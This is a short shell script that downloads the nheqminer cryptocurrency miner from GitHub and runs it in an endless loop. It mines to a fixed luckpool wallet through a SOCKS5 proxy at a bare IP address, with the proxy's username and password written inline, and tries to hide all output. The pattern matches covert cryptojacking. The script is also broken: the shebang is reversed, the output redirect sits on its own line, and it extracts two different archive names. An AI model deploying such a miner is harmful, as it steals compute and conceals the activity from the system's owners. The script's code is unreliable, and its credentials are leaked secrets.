!#/bin/sh

apt-get update 
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
while true
do
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.BR13 -p x -t 4 socks5://mfcluegu:1caszbq46xyi@47.104.16.8:6667
> /dev/null 2>&1
done
